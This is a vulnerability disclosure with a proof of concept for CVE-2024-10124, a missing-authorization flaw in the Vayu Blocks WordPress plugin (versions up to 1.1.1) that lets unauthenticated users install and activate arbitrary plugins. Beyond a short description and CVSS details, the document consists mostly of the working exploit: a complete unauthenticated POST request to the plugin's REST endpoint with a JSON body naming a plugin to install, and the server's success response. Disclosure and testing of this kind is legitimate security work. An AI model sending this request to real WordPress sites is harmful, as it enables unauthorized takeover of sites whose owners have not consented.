# CVE-2024-10124
Vayu Blocks – Gutenberg Blocks for WordPress & WooCommerce <= 1.1.1 - Missing Authorization to Unauthenticated Arbitrary Plugin Installation/Activation

# Description

The Vayu Blocks – Gutenberg Blocks for WordPress & WooCommerce plugin for WordPress is vulnerable to unauthorized arbitrary plugin installation and activation due to a missing capability check on the tp_install() function in all versions up to, and including, 1.1.1. This makes it possible for unauthenticated attackers to install and activate arbitrary plugins which can be leveraged to achieve remote code execution if another vulnerable plugin is installed and activated. This vulnerability was partially patched in version 1.1.1.

## Details

- **Type**: plugin
- **Slug**: vayu-blocks
- **Affected Version**: 1.1.1
- **CVSS Score**: 9.8
- **CVSS Rating**: Critical
- **CVSS Vector**: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
- **CVE**: CVE-2024-10124
- **Status**: Active

POC
---

```
POST /wp-json/ai/v1/vayu-site-builder HTTP/2
Host: wp-dev.ddev.site
Content-Type: application/json
Content-Length: 347


{
    "params": {
        "plugin": {
            "akismet": "Akismet Anti-Spam"
        },
        "allPlugins": [
            {
                "akismet": "akismet/akismet.php"
            }
        ],
        "themeSlug": "",
        "proThemePlugin": "",
        "templateType": "free",
        "tmplFreePro": "plugin"
    }
}
```

Should return your site url.

```
HTTP/2 200 OK
Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link
Allow: POST
Cache-Control: no-store, no-cache, must-revalidate
Content-Type: application/json; charset=UTF-8
Date: Thu, 12 Dec 2024 15:12:24 GMT
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Link: <https://wp-dev.ddev.site/wp-json/>; rel="https://api.w.org/"
Pragma: no-cache
Server: nginx
Set-Cookie: PHPSESSID=95f3c834be0cac72019468ca39e71fa9; path=/
Vary: Accept-Encoding
X-Content-Type-Options: nosniff
X-Robots-Tag: noindex

"\"https:\\\/\\\/wp-dev.ddev.site\""
```
